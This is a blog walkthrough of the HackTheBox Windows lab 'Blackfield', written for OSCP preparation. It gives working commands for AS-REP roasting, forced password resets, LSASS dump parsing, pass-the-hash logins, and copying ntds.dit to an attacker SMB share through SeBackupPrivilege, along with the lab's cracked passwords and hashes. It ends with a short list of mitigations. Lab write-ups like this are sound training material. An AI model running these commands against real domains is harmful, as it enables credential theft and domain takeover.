---
title: Blackfield
date: 2025-06-01
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, AS-REP-Roasting, ForceChangePassword, ACL-Abuse, pypykatz, LSASS-memory-dump, LSASS.DMP, SeBackupPrivilege-privesc] 
image: black.png
media_subpath: /assets/img/posts/2025-06-01-blackfieldHTB/
---

## Introduction

While working on the hard-rated Windows machine **Backfield**, I began by accessing an SMB share anonymously, which let me enumerate domain users. I identified a user account with Kerberos pre-authentication disabled, enabling me to perform an **ASREPRoasting** attack. After brute-forcing the AS-REP hash offline, I retrieved the user’s plaintext password. Using this access, I found another SMB share containing an **lsass.dmp** file, from which I extracted credentials for a user with **WinRM** access and **Backup Operators** group membership. With these privileges, I dumped the **NTDS.dit** file and cracked the domain administrator's hash, gaining full domain compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 53

Version: 

Domain: 

- **dig any DNS records**
    
    ```bash
    dig any blackfield.local @$IP
    ```
    
    ![image.png](image%203.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP <domain>
    ```
    
    ![image.png](image%204.png)
    

### Port 139/445

- **smbclient**
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    ![image.png](image%205.png)
    
- **netexec**
    
    ```bash
    sudo nxc smb $IP -u guest -p '' --shares
    ```
    
    ![image.png](image%206.png)
    

Connecting to `profiles$` share I see many profiles displayed

I noticed that share is large that’s why preferred to spider it using cme module:

```bash
crackmapexec smb <dc-ip> -u '' -p '' -M spider_plus --share 'profiles$'
```

![image.png](image%207.png)

But at least we have the list of potential usernames.

### Port 5985 (WinRM)

## Web

## AD Initial Enumeration

### User Enumeration

Unauthenticated

```bash
./kerbrute_linux_amd64 userenum -d blackfield.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 70
```

![image.png](image%208.png)

Authenticated

```bash
 lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

### Port 389/3268

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=<RHOST>,DC=local" 
```

## Initial Attack Vectors

### AS-REP Roasting

```bash
GetNPUsers.py blackfield.local/ -dc-ip $IP -no-pass -usersfile users
```

## Exploitation

As I have a list of potential usernames I can try for AS-REP Roasting. Among all invalid usernames and unsuccessful output I see one hash:

![image.png](image%209.png)

It is a support user that we identified before while enumerating domain users.

Let’s crack it now:

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2010.png)

We can use these credentials to login using `evil-winrm`.

Checking shares:

```bash
sudo nxc smb $IP -u support -p '#00^BlackKnight' --shares
```

![image.png](image%2011.png)

Checking Kerberoastable Users:

```bash
GetUserSPNs.py -dc-ip $IP blackfield.local/support
```

## Lateral Movement to audit 2020

I performed BloodHound enumeration using bloodhound-python and analysing our user first-degree privileges I found that we have `ForceChangePassword`  privilege over `audit2020` user.

![image.png](image%2012.png)

Running the following command I changed the password of `audit2020` user:

```bash
net rpc password "audit2020" "newP@ssword2022" -U "blackfield.local"/"support"%"#00^BlackKnight" -S $IP
```

![image.png](image%2013.png)

**Enumerating shares:**

```bash
sudo nxc smb $IP -u audit2020 -p "newP@ssword2022" --shares
```

![image.png](image%2014.png)

## Lateral Movement to svc_backup

In `forensic` share inside of `memory_analysis` I found `lsass` memory dump:

![image.png](image%2015.png)

There we can found hashes of logged in users. I am gonna dump information inside of it using `pypykatz`:

```bash
pypykatz lsa minidump lsass.DMP
```

Dumping it I found the hash of `svc_backup` user:

![image.png](image%2016.png)

Then using that hash I logged in using `evil-winrm`:

```bash
evil-winrm -i $IP -u svc_backup@blackfield.local -H 9658d1d1dcd9250115e2205d9f48400d
```

![image.png](image%2017.png)

## Privilege Escalation

Checking my privileges I identified that I have `SeBackupPrivilege` and `SeRestorePrivilege`:

![image.png](image%2018.png)

The SeBackupPrivilege lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV

reg save HKLM\SAM SAM.SAV
```

![image.png](image%2019.png)

Now let’s transfer them to attacker machine using smb share method as it is the fastest.

```bash
sudo impacket-smbserver share -smb2support .
```

![image.png](image%2020.png)

Now we can run `secretsdump.py` and dump SAM local database:

```bash
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

![image.png](image%2021.png)

Now let’s try local admin hash to see if local accounts allowed for remote access:

```bash
impacket-psexec Administrator@$IP -hashes :67ef902eae0d740df6257f273de75051
```

![image.png](image%2022.png)

```bash
evil-winrm -i $IP -u Administrator@blackfield.local -H 67ef902eae0d740df6257f273de75051
```

![image.png](image%2023.png)

Local Admin remote login is prohibited. 

I am gonna abuse SeBackupPrivilege using these [dlls](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug), diskshadow and robocopy.

1. Create a backup script
    
    ```powershell
    set verbose on
    set metadata C:\Windows\Temp\meta.cab
    set context clientaccessible
    set context persistent
    begin backup
    add volume C: alias cdrive
    create
    expose %cdrive% E:
    end backup
    ```
    
    Save it in diskshadow.txt
    
2. If you are creating it in linux before uploading it convert it to dos format using `unix2dos`.
3. Run the script
    
    ```powershell
    diskshadow.exe /s .\diskshadow.txt
    ```
    
    ![image.png](image%2024.png)
    
4. Set up SMB share
    
    ```powershell
    sudo impacket-smbserver share -smb2support .
    ```
    
5. Use robocopy to copy ntds.dit from new share to your smb share
    
    ```powershell
    robocopy /B E:\Windows\NTDS C:\tools ntds.dit
    or
    Copy-FileSeBackupPrivilege E:\Windows\ntds\ntds.dit \\10.10.14.12\share\ntds.dit
    ```
    
6. Dump NTDS hashes using`secretsdump`
    
    ```bash
    secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
    ```
    
    ![image.png](image%2025.png)
    

Now we can authenticate using `impacket-psexec`:

```bash
impacket-psexec Administrator@$IP -hashes :184fb5e5178480be64824d4cd53b99ee
```

For some reason it hanged a lot for me, so I used `impacket-wmiexec`:

![image.png](image%2026.png)

## Credentials

```bash
support : #00^BlackKnight
audit2020 : newP@ssword2022
Local Admin hash : 67ef902eae0d740df6257f273de75051
```

## Mitigation

- Enforce **Kerberos pre-authentication** for all user accounts.
- Restrict or monitor **anonymous/guest SMB access**.
- Secure LSASS memory from being dumped using **Credential Guard** or **LSASS protections**.
- Minimize use of **Backup Operators** group or apply Just-In-Time (JIT) access.
- Regularly audit privileged groups and user permissions within Active Directory.
